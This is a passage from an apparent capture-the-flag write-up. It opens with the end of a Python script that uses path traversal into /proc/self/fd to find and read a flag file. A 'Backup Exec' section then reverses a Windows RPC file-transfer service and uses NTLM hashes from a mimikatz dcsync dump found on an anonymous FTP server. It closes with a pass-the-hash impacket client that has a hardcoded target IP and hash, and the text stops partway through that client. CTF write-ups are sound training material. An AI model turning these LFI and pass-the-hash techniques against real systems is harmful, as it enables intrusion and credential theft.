</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>spammer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>daemon</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>threads</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Authorization&#34;</span><span class=p>:</span> <span class=n>api_key</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_file</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Hunting for payload in /proc/self/fd/...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span> <span class=o>&lt;</span> <span class=mi>60</span><span class=p>:</span> <span class=c1># 1 minute timeout</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>fd</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mi>15</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># LFI into the procfs FD to read our own incoming request and render it as a template</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/admin&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;tmpl&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;../../../../proc/self/fd/</span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s2>&#34;[&#39;app.py&#39;&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=c1># Look for the random flag filename</span>
</span></span><span class=line><span class=cl>                    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;flag-[a-f0-9]</span><span class=si>{32}</span><span class=s2>\.txt&#34;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>flag_file</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Found flag file: </span><span class=si>{</span><span class=n>flag_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=n>stop_event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=n>flag_file</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span> <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>stop_event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_flag</span><span class=p>(</span><span class=n>api_key</span><span class=p>,</span> <span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Stage 3: Reading </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Authorization&#34;</span><span class=p>:</span> <span class=n>api_key</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Simple LFI to read the flag</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/admin&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;tmpl&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;../../../../</span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[!!!] FLAG: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>leak_api_key</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag_file</span> <span class=o>=</span> <span class=n>find_flag_filename</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>flag_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>read_flag</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>flag_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Failed to find flag filename. The race might be tough.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Failed to leak API_KEY.&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>alictf{301e7a69-1262-4955-abe7-c8a120bd2093}
</span></span></code></pre></td></tr></table></div></div><h2 id=backup-exec>Backup Exec</h2><p>Re + Web</p><p>题目说明了攻击路径+flag路径，任务就是复盘+读取 <code>C:\Users\Administrator\Desktop\flag.txt</code></p><p>非常善良的题目 甚至给了pdb 直接狠狠拖入IDA</p><p>用 IDA-NO-MCP 导出一下让AI分析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Markdown data-lang=Markdown><span class=line><span class=cl>逆向 RPC 分析过程
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>1.</span> 快速确认是 RPC 服务
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> 在 imports 里看到 RPCRT4.dll，大量 RpcServer* / NdrServerCall* 函数。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 在 strings 里能搜到 ncacn_ip_tcp、RpcServerRegisterIf2 等关键字。
</span></span><span class=line><span class=cl>    → 确认为 RPC over TCP。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>2.</span> 定位启动函数与端口
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> 在 IDA 里找 RpcServerUseProtseqEpW 调用点，对应函数名 StartRPCServer。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 函数里写死端口列表：69128, 62831, 67540, 60325, 63588，按顺序尝试，成功即监听。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 输出日志里打印 [Server] Using port %d，用于验证逻辑。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>3.</span> 认证/授权逻辑
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> RpcServerRegisterIf2(..., AuthorizationFunc) 表示注册了授权回调。
</span></span><span class=line><span class=cl>  <span class=k>-</span> AuthorizationFunc → IsClientInBackupAdminGroup。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 在 IsClientInBackupAdminGroup 里看到 ConvertStringSidToSidW(&#34;S-1-5-21-...-1624&#34;)
</span></span><span class=line><span class=cl>    → 组 SID 被硬编码（必须是该组成员）。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 还会 RpcImpersonateClient + OpenThreadToken + TokenGroups + EqualSid 做组验证。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>4.</span> RPC 通信加密强制
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> CheckClientSecurityLevel 调用 RpcBindingInqAuthClientW，判断 authLevel &gt;= 6
</span></span><span class=line><span class=cl>    也就是 RPC_C_AUTHN_LEVEL_PKT_PRIVACY。
</span></span><span class=line><span class=cl>    → 必须开启签名+加密。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>5.</span> 用 PDB 还原接口结构
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> 用 llvm-pdbutil dump --globals 找到：
</span></span><span class=line><span class=cl>      <span class=k>-</span> FileTransfer___RpcServerInterface
</span></span><span class=line><span class=cl>      <span class=k>-</span> FileTransfer_v1_0_DispatchTable
</span></span><span class=line><span class=cl>      <span class=k>-</span> FileTransfer_ServerRoutineTable
</span></span><span class=line><span class=cl>  <span class=k>-</span> 通过 PDB 给出的地址，去 .rdata 里解析 _RPC_SERVER_INTERFACE 结构。
</span></span><span class=line><span class=cl>    解析方式：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    file_offset = section_file_offset + (VA - image_base - section_VA)
</span></span><span class=line><span class=cl>  <span class=k>-</span> 从 _RPC_SERVER_INTERFACE 解析到接口 UUID：
</span></span><span class=line><span class=cl>    62e00289-44bd-497b-b85f-bc340fbcc2b0 版本 1.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>6.</span> 还原 opnum -&gt; 函数映射
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> FileTransfer_ServerRoutineTable 是函数指针表。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 读到的顺序即为 opnum：
</span></span><span class=line><span class=cl>    <span class=k>0.</span> OpenRemoteFile
</span></span><span class=line><span class=cl>      <span class=k>1.</span> ReadFileData
</span></span><span class=line><span class=cl>      <span class=k>2.</span> CloseFileHandle
</span></span><span class=line><span class=cl>      <span class=k>3.</span> GetFileInfo
</span></span><span class=line><span class=cl>      <span class=k>4.</span> ListDirectory
</span></span><span class=line><span class=cl>      <span class=k>5.</span> ShutdownServer
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>7.</span> 解析 MIDL 参数/返回结构
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> PDB 中还有 FileTransfer__MIDL_ProcFormatString 和 FileTransfer_FormatStringOffsetTable。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 通过偏移表（0x0, 0x3c, 0x84, 0xa8, 0xde, 0x120）定位每个 op 的 NDR 格式。
</span></span><span class=line><span class=cl>  <span class=k>-</span> 结合返回包实际长度，确认 OpenRemoteFile 的 out 参数是按值返回而不是指针。
</span></span><span class=line><span class=cl>    返回结构实际布局：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    [20 bytes ctx_handle]
</span></span><span class=line><span class=cl>    [4 bytes padding]
</span></span><span class=line><span class=cl>    [8 bytes fileSize]
</span></span><span class=line><span class=cl>    [4 bytes error]
</span></span><span class=line><span class=cl>    [1 byte return]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>8.</span> XOR 加密逻辑
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> ReadFileData 中明确调用 XOREncryptDecrypt。
</span></span><span class=line><span class=cl>  <span class=k>-</span> PDB 可定位 XOR_KEY 全局变量地址，从 .rdata 直接取 16 字节密钥：
</span></span><span class=line><span class=cl>    2a7fc3915e348b19d267f428ab76439d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  ———
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  总结要点（RPC 逆向得到的核心结论）
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>-</span> 协议：ncacn_ip_tcp
</span></span><span class=line><span class=cl>  <span class=k>-</span> 端口优先级：69128 → 62831 → 67540 → 60325 → 63588
</span></span><span class=line><span class=cl>  <span class=k>-</span> 接口 UUID：62e00289-44bd-497b-b85f-bc340fbcc2b0 v1.0
</span></span><span class=line><span class=cl>  <span class=k>-</span> 必须 PKT_PRIVACY 认证
</span></span><span class=line><span class=cl>  <span class=k>-</span> 组成员 SID 必须为 ...-1624
</span></span><span class=line><span class=cl>  <span class=k>-</span> opnum 映射固定 0~5
</span></span><span class=line><span class=cl>  <span class=k>-</span> ReadFileData 返回数据需要 XOR 解密
</span></span></code></pre></td></tr></table></div></div><p>整理一下得到的信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>RPC 服务
</span></span><span class=line><span class=cl>协议：ncacn_ip_tcp
</span></span><span class=line><span class=cl>端口选择顺序：
</span></span><span class=line><span class=cl>    69128 → 62831 → 67540 → 60325 → 63588
</span></span><span class=line><span class=cl>接口 UUID：
</span></span><span class=line><span class=cl>    62e00289-44bd-497b-b85f-bc340fbcc2b0 v1.0
</span></span><span class=line><span class=cl>调用必须：
</span></span><span class=line><span class=cl>    PKT_PRIVACY（RPC_AUTHN_LEVEL_PKT_PRIVACY）
</span></span><span class=line><span class=cl>    组成员校验：硬编码 SID
</span></span><span class=line><span class=cl>    S-1-5-21-3223156632-3195994233-1317593892-1624
</span></span><span class=line><span class=cl>RPC 方法（opnum）
</span></span><span class=line><span class=cl>    OpenRemoteFile
</span></span><span class=line><span class=cl>    ReadFileData
</span></span><span class=line><span class=cl>    CloseFileHandle
</span></span><span class=line><span class=cl>    GetFileInfo
</span></span><span class=line><span class=cl>    ListDirectory
</span></span><span class=line><span class=cl>    ShutdownServer
</span></span><span class=line><span class=cl>加密
</span></span><span class=line><span class=cl>  ReadFileData 会对文件内容 XOR 加密：
</span></span><span class=line><span class=cl>  XOR Key =&gt; 2a7fc3915e348b19d267f428ab76439d
</span></span></code></pre></td></tr></table></div></div><p>根据题目中的 <code>攻击者曾在系统上创建并配置了一个恶意 FTP 服务</code>，试一下 发现可以匿名登录 anonymous</p><p><img src=/img/2026-alictf/23.png alt=img></p><p>然后在 <code>microsoft </code>目录下发现 <code>results.txt</code>，内容是 mimikatz dcsync /all 输出，包含大量 NTLM 哈希</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>SAM Username         : Server Backup Operators
</span></span><span class=line><span class=cl>Object Security ID   : S-1-5-21-3223156632-3195994233-1317593892-1624
</span></span><span class=line><span class=cl>Object Relative ID   : 1624
</span></span></code></pre></td></tr></table></div></div><p>找到 <code>RPC</code> 要求的 SID 组</p><p>理论上可能是要用查询下 <code>Server Backup Operators</code> 组成员吧</p><p>但是我环境好像有问题 就把Username提出来猜了几个，发现 <code>svc_dbbackup</code> 是对的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5</span> <span class=kn>import</span> <span class=n>transport</span><span class=p>,</span> <span class=n>rpcrt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TARGET</span><span class=o>=</span><span class=s2>&#34;116.62.114.4&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PORT</span><span class=o>=</span><span class=mi>62831</span>
</span></span><span class=line><span class=cl><span class=n>DOMAIN</span><span class=o>=</span><span class=s2>&#34;corp.local&#34;</span>
</span></span><span class=line><span class=cl><span class=n>USER</span><span class=o>=</span><span class=s2>&#34;svc_dbbackup&#34;</span>
</span></span><span class=line><span class=cl><span class=n>NTHASH</span><span class=o>=</span><span class=s2>&#34;eb2c652c8e8bfeed348d66ffa98be0d1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>KEY</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s1>&#39;2a7fc3915e348b19d267f428ab76439d&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_dec</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>b</span> <span class=o>^</span> <span class=n>KEY</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=mi>16</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ndr_wstring_ref</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16-le&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>w</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>stub</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;III&#34;</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>+</span> <span class=n>w</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>stub</span><span class=p>)</span> <span class=o>%</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>stub</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=p>(</span><span class=mi>4</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>stub</span><span class=p>)</span><span class=o>%</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>stub</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>open_file</span><span class=p>(</span><span class=n>dce</span><span class=p>,</span> <span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>ndr_wstring_ref</span><span class=p>(</span><span class=n>path</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>dce</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ctx</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[:</span><span class=mi>20</span><span class=p>]</span>  <span class=c1># context handle</span>
</span></span><span class=line><span class=cl>    <span class=c1># align to 8</span>
</span></span><span class=line><span class=cl>    <span class=n>fsize</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=p>,</span> <span class=mi>24</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>err</span>   <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=p>,</span> <span class=mi>32</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span>   <span class=o>=</span> <span class=n>resp</span><span class=p>[</span><span class=mi>36</span><span class=p>]</span> <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>36</span> <span class=k>else</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ctx</span><span class=p>,</span> <span class=n>fsize</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_file</span><span class=p>(</span><span class=n>dce</span><span class=p>,</span> <span class=n>ctx</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>stub</span> <span class=o>=</span> <span class=n>ctx</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;II&#34;</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>stub</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>dce</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
